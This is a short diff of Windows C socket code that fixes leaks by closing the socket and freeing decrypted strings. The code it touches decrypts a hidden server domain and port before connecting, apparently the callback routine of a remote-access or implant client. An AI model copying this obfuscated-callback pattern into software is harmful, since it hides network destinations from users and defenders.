@@ -31,6 +31,7 @@ PSOCKET_MANAGER initSocketManager(PMESSAGE_QUEUE queueMessageReceived, PMESSAGE_
 BOOL destroySocketManager(PSOCKET_MANAGER pSockManager)
 {
 
+    closesocket(pSockManager->s);
     freeMemory(pSockManager);
     return TRUE;
 };
@@ -137,7 +138,7 @@ SOCKET _initWindowsSocket()
     PCSTR server =  (PCSTR)decrypt(CRYPT_SERVER_DOMAIN, strlen(CRYPT_SERVER_DOMAIN));
     PCSTR portStr =  (PCSTR)decrypt(CRYPT_PORT_SERVER, strlen(CRYPT_PORT_SERVER));
     u_short port = atoi(portStr);
-    freeMemory(portStr);
+
     
     struct sockaddr_in sockAddr =
     {
@@ -164,5 +165,7 @@ SOCKET _initWindowsSocket()
         return INVALID_SOCKET;
     };
 
+    freeMemory(server);
+    freeMemory(portStr);
     return sock;
 }
